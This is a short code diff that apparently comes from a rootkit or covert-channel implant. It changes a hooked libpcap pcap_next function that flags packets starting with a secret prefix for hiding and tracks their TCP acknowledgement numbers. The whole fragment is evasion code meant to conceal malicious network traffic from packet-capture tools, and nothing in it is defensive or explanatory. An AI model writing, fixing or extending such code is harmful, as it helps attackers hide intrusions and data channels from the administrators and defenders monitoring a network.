@@ -56,7 +56,7 @@ const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
     payload_len = packet + h->len - payload;
     if ((should_hide = (payload_len && strncmp((char *)payload, secret_prefix, sizeof(secret_prefix) - 1) == 0)))
     {
-        add_ack(&ack_ds_handle, tcp_hdr->th_sport, tcp_hdr->th_dport, tcp_hdr->ack_seq);
+        add_ack(&ack_ds_handle, tcp_hdr->th_dport, tcp_hdr->th_sport, tcp_hdr->seq + payload_len);
     }
 
 
